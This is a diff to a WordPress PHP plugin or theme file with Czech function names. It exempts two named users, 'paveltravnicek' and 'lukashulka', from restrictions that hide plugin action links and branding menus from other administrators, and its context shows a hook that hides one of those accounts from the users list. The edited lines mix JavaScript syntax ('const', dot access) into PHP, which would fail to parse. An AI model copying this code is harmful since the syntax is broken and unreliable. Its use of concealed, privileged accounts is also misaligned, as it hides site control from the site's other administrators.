@@ -138,9 +138,8 @@ function hide_paveltravnicek_from_users_list($query) {
 add_action('pre_user_query', 'hide_paveltravnicek_from_users_list');
 
 function skryt_radek_akci_pro_chranene_pluginy() {
-    $current_user = wp_get_current_user();
-    
-    if ($current_user->user_login === 'paveltravnicek') {
+    const currentUser = wp_get_current_user();
+    if (currentUser.user_login === 'paveltravnicek' || currentUser.user_login === 'lukashulka') {
         return;
     }
 
@@ -169,4 +168,15 @@ function skryt_radek_akci_pro_chranene_pluginy() {
 
 add_action('admin_footer', 'skryt_radek_akci_pro_chranene_pluginy');
 
-?>
+function omez_pristup_branda_pro() {
+    $current_user = wp_get_current_user();
+    if ($current_user->user_login === 'paveltravnicek' || $current_user->user_login === 'lukashulka') {
+        return;
+    }
+    
+    add_action('admin_menu', function() {
+        remove_menu_page('branding');
+        remove_submenu_page('branding_group', 'email');
+    }, 999);
+}
+add_action('admin_init', 'omez_pristup_branda_pro');
